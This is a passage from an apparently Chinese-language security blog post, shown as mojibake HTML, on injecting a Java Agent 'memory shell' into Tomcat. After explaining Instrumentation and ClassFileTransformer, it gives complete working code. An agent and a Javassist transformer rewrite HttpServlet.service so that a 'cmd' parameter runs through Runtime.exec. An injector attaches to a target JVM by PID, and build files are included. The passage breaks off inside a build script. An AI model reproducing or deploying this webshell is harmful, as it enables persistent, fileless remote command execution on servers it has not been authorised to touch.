äºŒè¿›åˆ¶æµçš„æ•°æ®ï¼Œå‚æ•° canRetransform è®¾ç½®æ˜¯å¦å…è®¸é‡æ–°è½¬æ¢ã€‚</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-type">boolean</span> canRetransform)</span>;<br></code></pre></td></tr></table></figure><p><strong>ClassFileTransformer</strong>æ¥å£ä¸­åªæœ‰ä¸€ä¸ª**transform()**æ–¹æ³•ï¼Œè¿”å›å€¼ä¸ºå­—èŠ‚æ•°ç»„ï¼Œä½œä¸ºè½¬æ¢åçš„å­—èŠ‚ç æ³¨å…¥åˆ°ç›®æ ‡JVMä¸­ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523698.png" alt="img"></p><p>åœ¨é€šè¿‡ addTransformer æ³¨å†Œä¸€ä¸ªtransformeråï¼Œæ¯æ¬¡å®šä¹‰æˆ–è€…é‡å®šä¹‰æ–°ç±»éƒ½ä¼šè°ƒç”¨transformerã€‚æ‰€è°“å®šä¹‰ï¼Œå³æ˜¯é€šè¿‡ClassLoader.defineClassåŠ è½½è¿›æ¥çš„ç±»ã€‚è€Œé‡å®šä¹‰æ˜¯é€šè¿‡Instrumentation.redefineClassesæ–¹æ³•é‡å®šä¹‰çš„ç±»ã€‚</p><p>å½“å­˜åœ¨å¤šä¸ªè½¬æ¢å™¨æ—¶ï¼Œè½¬æ¢å°†ç”± transform è°ƒç”¨é“¾ç»„æˆã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ª transform è°ƒç”¨è¿”å›çš„ byte æ•°ç»„å°†æˆä¸ºä¸‹ä¸€ä¸ªè°ƒç”¨çš„è¾“å…¥ï¼ˆé€šè¿‡ classfileBuffer å‚æ•°ï¼‰ã€‚</p><p>è½¬æ¢å°†æŒ‰ä»¥ä¸‹é¡ºåºåº”ç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">ä¸å¯é‡è½¬æ¢è½¬æ¢å™¨<br>ä¸å¯é‡è½¬æ¢æœ¬æœºè½¬æ¢å™¨<br>å¯é‡è½¬æ¢è½¬æ¢å™¨<br>å¯é‡è½¬æ¢æœ¬æœºè½¬æ¢å™¨<br></code></pre></td></tr></table></figure><p>è‡³äºtransformerä¸­å¯¹å­—èŠ‚ç çš„å…·ä½“æ“ä½œï¼Œåˆ™éœ€è¦ä½¿ç”¨åˆ°Javassisitç±»ã€‚</p><h4 id="Instrumentationçš„å±€é™æ€§"><a href="#Instrumentationçš„å±€é™æ€§" class="headerlink" title="Instrumentationçš„å±€é™æ€§"></a>Instrumentationçš„å±€é™æ€§</h4><p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨Instrumentationéƒ½æ˜¯ä½¿ç”¨å…¶å­—èŠ‚ç æ’æ¡©çš„åŠŸèƒ½ï¼Œç®€å•æ¥è¯´å°±æ˜¯ç±»é‡å®šä¹‰åŠŸèƒ½ï¼ˆClass Redefineï¼‰ï¼Œä½†æ˜¯æœ‰ä»¥ä¸‹å±€é™æ€§ï¼š</p><p>premainå’Œagentmainä¸¤ç§æ–¹å¼ä¿®æ”¹å­—èŠ‚ç çš„æ—¶æœºéƒ½æ˜¯ç±»æ–‡ä»¶åŠ è½½ä¹‹åï¼Œä¹Ÿå°±æ˜¯è¯´å¿…é¡»è¦å¸¦æœ‰Classç±»å‹çš„å‚æ•°ï¼Œä¸èƒ½é€šè¿‡å­—èŠ‚ç æ–‡ä»¶å’Œè‡ªå®šä¹‰çš„ç±»åé‡æ–°å®šä¹‰ä¸€ä¸ªæœ¬æ¥ä¸å­˜åœ¨çš„ç±»ã€‚</p><p>ç±»çš„å­—èŠ‚ç ä¿®æ”¹ç§°ä¸ºç±»è½¬æ¢(Class Transform)ï¼Œç±»è½¬æ¢å…¶å®æœ€ç»ˆéƒ½å›å½’åˆ°ç±»é‡å®šä¹‰I<code>nstrumentation#redefineClasses</code>æ–¹æ³•ï¼Œæ­¤æ–¹æ³•æœ‰ä»¥ä¸‹é™åˆ¶ï¼š</p><ol><li>æ–°ç±»å’Œè€ç±»çš„çˆ¶ç±»å¿…é¡»ç›¸åŒ</li><li>æ–°ç±»å’Œè€ç±»å®ç°çš„æ¥å£æ•°ä¹Ÿè¦ç›¸åŒï¼Œå¹¶ä¸”æ˜¯ç›¸åŒçš„æ¥å£</li><li>æ–°ç±»å’Œè€ç±»è®¿é—®ç¬¦å¿…é¡»ä¸€è‡´ã€‚ æ–°ç±»å’Œè€ç±»å­—æ®µæ•°å’Œå­—æ®µåè¦ä¸€è‡´</li><li>æ–°ç±»å’Œè€ç±»æ–°å¢æˆ–åˆ é™¤çš„æ–¹æ³•å¿…é¡»æ˜¯private static&#x2F;finalä¿®é¥°çš„</li><li>å¯ä»¥ä¿®æ”¹æ–¹æ³•ä½“</li></ol><h2 id="4-3-Agent-å†…å­˜é©¬æ³¨å…¥"><a href="#4-3-Agent-å†…å­˜é©¬æ³¨å…¥" class="headerlink" title="4.3 Agent å†…å­˜é©¬æ³¨å…¥"></a>4.3 Agent å†…å­˜é©¬æ³¨å…¥</h2><p>çœ‹äº†è®¸å¤šå¸ˆå‚…å…³äºAgentå†…å­˜é©¬æ³¨å…¥çš„æ–‡ç« å’Œåšå®¢ï¼Œå„æœ‰åƒç§‹ï¼Œåˆ©ç”¨æ–¹å¼ä¹Ÿå„ä¸ç›¸åŒã€‚ç°åœ¨ï¼Œæˆ‘æ ¹æ®è‡ªå·±çš„ç†è§£æ¥ç¼–å†™ä¸€ä¸ªå°demoã€‚</p><h3 id="4-3-1-æ–¹å¼ä¸€ï¼ˆåç»­å¯èƒ½ä¼šå¤ç°å…¶ä»–å¸ˆå‚…çš„åˆ©ç”¨æ–¹å¼ï¼‰"><a href="#4-3-1-æ–¹å¼ä¸€ï¼ˆåç»­å¯èƒ½ä¼šå¤ç°å…¶ä»–å¸ˆå‚…çš„åˆ©ç”¨æ–¹å¼ï¼‰" class="headerlink" title="4.3.1 æ–¹å¼ä¸€ï¼ˆåç»­å¯èƒ½ä¼šå¤ç°å…¶ä»–å¸ˆå‚…çš„åˆ©ç”¨æ–¹å¼ï¼‰"></a>4.3.1 æ–¹å¼ä¸€ï¼ˆåç»­å¯èƒ½ä¼šå¤ç°å…¶ä»–å¸ˆå‚…çš„åˆ©ç”¨æ–¹å¼ï¼‰</h3><h4 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h4><ol><li>ç¼–è¯‘å¹¶æ‰“åŒ… <code>AgentMemShell</code> ä¸º <code>agentmemshell.jar</code>ã€‚</li><li>ç¼–è¯‘ <code>Injector</code>ï¼ˆéœ€è¦ <code>tools.jar</code>ï¼Œé€šå¸¸åœ¨ <code>JAVA_HOME/lib/</code> ä¸‹ï¼‰ã€‚</li><li>è¿è¡Œ <code>Injector</code>ï¼ŒæŒ‡å®šç›®æ ‡ Tomcat çš„ PIDã€‚</li><li>è®¿é—®ä»»ä½• Servlet è·¯å¾„ï¼Œå¸¦ä¸Š <code>?cmd=whoami</code> å‚æ•°ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤ã€‚</li></ol><h4 id="å¯ç”¨-Demoï¼š"><a href="#å¯ç”¨-Demoï¼š" class="headerlink" title="å¯ç”¨ Demoï¼š"></a>å¯ç”¨ Demoï¼š</h4><h5 id="ç›®å½•ç»“æ„ï¼š-1"><a href="#ç›®å½•ç»“æ„ï¼š-1" class="headerlink" title="ç›®å½•ç»“æ„ï¼š"></a>ç›®å½•ç»“æ„ï¼š</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524589.png" alt="img"></p><h5 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br> xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;<br>&lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;<br><br>&lt;groupId&gt;com.src&lt;/groupId&gt;<br>&lt;artifactId&gt;Demo01&lt;/artifactId&gt;<br>&lt;version&gt;<span class="hljs-number">1.0</span>-SNAPSHOT&lt;/version&gt;<br>&lt;packaging&gt;jar&lt;/packaging&gt;<br><br>&lt;properties&gt;<br>&lt;project.build.sourceEncoding&gt;UTF-<span class="hljs-number">8</span>&lt;/project.build.sourceEncoding&gt;<br>&lt;maven.compiler.source&gt;<span class="hljs-number">1.8</span>&lt;/maven.compiler.source&gt;<br>&lt;maven.compiler.target&gt;<span class="hljs-number">1.8</span>&lt;/maven.compiler.target&gt;<br>&lt;/properties&gt;<br>&lt;build&gt;<br>&lt;plugins&gt;<br>&lt;!-- ç¼–è¯‘æ’ä»¶ --&gt;<br>&lt;plugin&gt;<br>&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;<br>&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;<br>&lt;version&gt;<span class="hljs-number">3.8</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>&lt;configuration&gt;<br>&lt;source&gt;<span class="hljs-number">1.8</span>&lt;/source&gt;<br>&lt;target&gt;<span class="hljs-number">1.8</span>&lt;/target&gt;<br>&lt;encoding&gt;UTF-<span class="hljs-number">8</span>&lt;/encoding&gt;<br>&lt;/configuration&gt;<br>&lt;/plugin&gt;<br><br>&lt;!-- æ‰“åŒ… JAR æ’ä»¶ --&gt;<br>&lt;plugin&gt;<br>&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;<br>&lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;<br>&lt;version&gt;<span class="hljs-number">3.2</span><span class="hljs-number">.2</span>&lt;/version&gt;<br>&lt;configuration&gt;<br>&lt;archive&gt;<br>&lt;!-- ç¡®ä¿ç”Ÿæˆæ ‡å‡† MANIFEST æ–‡ä»¶ --&gt;<br>&lt;manifest&gt;<br>&lt;addClasspath&gt;<span class="hljs-literal">true</span>&lt;/addClasspath&gt;<br>&lt;useUniqueVersions&gt;<span class="hljs-literal">false</span>&lt;/useUniqueVersions&gt;<br>&lt;/manifest&gt;<br><br>&lt;!-- è¿™é‡Œå†™å…¥ Agent å±æ€§ --&gt;<br>&lt;manifestEntries&gt;<br>&lt;Agent-Class&gt;com.src.agent.AgentMain&lt;/Agent-Class&gt;<br>&lt;Can-Redefine-Classes&gt;<span class="hljs-literal">true</span>&lt;/Can-Redefine-Classes&gt;<br>&lt;Can-Retransform-Classes&gt;<span class="hljs-literal">true</span>&lt;/Can-Retransform-Classes&gt;<br>&lt;/manifestEntries&gt;<br>&lt;/archive&gt;<br>&lt;/configuration&gt;<br>&lt;/plugin&gt;<br>&lt;/plugins&gt;<br>&lt;/build&gt;<br><br><br>&lt;/project&gt;<br></code></pre></td></tr></table></figure><h5 id="AgentMemShell-java"><a href="#AgentMemShell-java" class="headerlink" title="AgentMemShell.java"></a>AgentMemShell.java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentMemShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;AgentMemShell Injected!&quot;</span>);<br><br>        <span class="hljs-comment">// æ·»åŠ ç±»è½¬æ¢å™¨</span><br>        inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletTransformer</span>(), <span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// æ‰¾åˆ°æ‰€æœ‰å·²åŠ è½½çš„ HttpServlet ç±»å¹¶è¿›è¡Œé‡è½¬æ¢</span><br>        Class[] loadedClasses = inst.getAllLoadedClasses();<br>        <span class="hljs-keyword">for</span> (Class clazz : loadedClasses) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getName().equals(<span class="hljs-string">&quot;javax.servlet.http.HttpServlet&quot;</span>)) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    System.out.println(<span class="hljs-string">&quot;Found HttpServlet:&quot;</span>+clazz);<br>                    inst.retransformClasses(clazz);<br>                    System.out.println(<span class="hljs-string">&quot;Retransform HttpServlet Success.&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    e.printStackTrace();<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        agentmain(agentArgs, inst);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="ServletTransformer-java"><a href="#ServletTransformer-java" class="headerlink" title="ServletTransformer.java"></a>ServletTransformer.java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> javassist.LoaderClassPath;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader,<br>                            String className,<br>                            Class&lt;?&gt; classBeingRedefined,<br>                            ProtectionDomain protectionDomain,<br>                            <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// æ‰“å°æ‰€æœ‰è¢«åŠ è½½çš„ç±»ï¼Œä¾¿äºè°ƒè¯•ï¼ˆä»…ç¬¬ä¸€æ¬¡æ³¨å…¥æ—¶å¯ç”¨ï¼‰</span><br>            <span class="hljs-keyword">if</span> (className != <span class="hljs-literal">null</span> &amp;&amp; className.contains(<span class="hljs-string">&quot;servlet&quot;</span>)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;[Debug] Loading class: &quot;</span> + className);<br>            &#125;<br><br>            <span class="hljs-comment">// className å¯èƒ½æ˜¯ &quot;javax/servlet/http/HttpServlet&quot;</span><br>            <span class="hljs-comment">// ä¹Ÿå¯èƒ½æ˜¯ &quot;javax.servlet.http.HttpServlet&quot;</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">dotName</span> <span class="hljs-operator">=</span> className.replace(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><br>            <span class="hljs-comment">// ç²¾ç¡®åŒ¹é… HttpServlet ç±»</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;javax.servlet.http.HttpServlet&quot;</span>.equals(dotName)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;[+] Found target class: &quot;</span> + dotName);<br>                System.out.println(<span class="hljs-string">&quot;[+] Start transforming HttpServlet...&quot;</span>);<br><br>                <span class="hljs-comment">// åˆå§‹åŒ– Javassist ClassPool å¹¶æ·»åŠ å½“å‰ ClassLoader çš„è·¯å¾„</span><br>                <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>                <span class="hljs-keyword">if</span> (loader != <span class="hljs-literal">null</span>) &#123;<br>                    classPool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoaderClassPath</span>(loader));<br>                &#125;<br><br>                <span class="hljs-comment">// è·å–ç±»å®šä¹‰</span><br>                <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(dotName);<br>                <span class="hljs-type">CtMethod</span> <span class="hljs-variable">serviceMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;service&quot;</span>);<br><br>                <span class="hljs-comment">// æ¶æ„é€»è¾‘</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br>                        + <span class="hljs-string">&quot;&#123;&quot;</span><br>                        + <span class="hljs-string">&quot;    javax.servlet.http.HttpServletRequest req = (javax.servlet.http.HttpServletRequest)$1;&quot;</span><br>                        + <span class="hljs-string">&quot;    javax.servlet.http.HttpServletResponse res = (javax.servlet.http.HttpServletResponse)$2;&quot;</span><br>                        + <span class="hljs-string">&quot;    String cmd = req.getParameter(\&quot;cmd\&quot;);&quot;</span><br>                        + <span class="hljs-string">&quot;    if (cmd != null) &#123;&quot;</span><br>                        + <span class="hljs-string">&quot;        try &#123;&quot;</span><br>                        + <span class="hljs-string">&quot;            java.util.Scanner s = new java.util.Scanner(&quot;</span><br>                        + <span class="hljs-string">&quot;                Runtime.getRuntime().exec(cmd).getInputStream(), \&quot;UTF-8\&quot;&quot;</span><br>                        + <span class="hljs-string">&quot;            ).useDelimiter(\&quot;\\\\A\&quot;);&quot;</span><br>                        + <span class="hljs-string">&quot;            String output = s.hasNext() ? s.next() : \&quot;\&quot;;&quot;</span><br>                        + <span class="hljs-string">&quot;            res.setContentType(\&quot;text/plain;charset=UTF-8\&quot;);&quot;</span><br>                        + <span class="hljs-string">&quot;            res.getWriter().write(output);&quot;</span><br>                        + <span class="hljs-string">&quot;            res.getWriter().flush();&quot;</span><br>                        + <span class="hljs-string">&quot;            return;&quot;</span><br>                        + <span class="hljs-string">&quot;        &#125; catch (Exception e) &#123;&quot;</span><br>                        + <span class="hljs-string">&quot;            e.printStackTrace();&quot;</span><br>                        + <span class="hljs-string">&quot;        &#125;&quot;</span><br>                        + <span class="hljs-string">&quot;    &#125;&quot;</span><br>                        + <span class="hljs-string">&quot;&#125;&quot;</span>;<br><br>                <span class="hljs-comment">// åœ¨ service æ–¹æ³•çš„å¼€å¤´æ’å…¥</span><br>                serviceMethod.insertBefore(shell);<br><br>                <span class="hljs-type">byte</span>[] newClassBytes = ctClass.toBytecode();<br>                ctClass.detach();<br><br>                System.out.println(<span class="hljs-string">&quot;[+] HttpServlet Transformed Complete.&quot;</span>);<br>                <span class="hljs-keyword">return</span> newClassBytes;<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;[!] Transform failed: &quot;</span> + e);<br>            e.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-comment">// è¿”å› null è¡¨ç¤ºä¸ä¿®æ”¹è¯¥ç±»</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Injector-java"><a href="#Injector-java" class="headerlink" title="Injector.java"></a>Injector.java</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.injector;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Injector</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">if</span> (args.length &lt; <span class="hljs-number">2</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Usage: java -jar injector.jar &lt;pid&gt; &lt;agent_jar_path&gt;&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;Available JVM processes:&quot;</span>);<br>            listProcesses();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">String</span> <span class="hljs-variable">agentJarPath</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">1</span>];<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;Trying to attach to PID: &quot;</span> + pid);<br>            <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> VirtualMachine.attach(pid);<br>            vm.loadAgent(agentJarPath);<br>            vm.detach();<br>            System.out.println(<span class="hljs-string">&quot;[+] Agent injected successfully!&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;[-] Injection failed: &quot;</span> + e.getMessage());<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">listProcesses</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            List&lt;VirtualMachineDescriptor&gt; vmList = VirtualMachine.list();<br>            <span class="hljs-keyword">for</span> (VirtualMachineDescriptor vmd : vmList) &#123;<br>                System.out.println(<span class="hljs-string">&quot;PID: &quot;</span> + vmd.id() + <span class="hljs-string">&quot; - &quot;</span> + vmd.displayName());<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;[-] Failed to list processes: &quot;</span> + e.getMessage());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="MANIFEST-MF"><a href="#MANIFEST-MF" class="headerlink" title="MANIFEST.MF"></a>MANIFEST.MF</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Agent-Class: com.src.agent.AgentMemShell<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Built-By: maven<br>Created-By: Apache Maven<br>Build-Jdk: 1.8.0_65<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ ä¸€ä¸ªå°è„šæœ¬ï¼š</p><h5 id="build-bat"><a href="#build-bat" class="headerlink" title="build.bat"></a>build.bat</h5><p>(éƒ¨åˆ†å†…å®¹æ ¹æ®å®é™…æƒ…å†µè‡ªè¡Œä¿®æ”¹)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 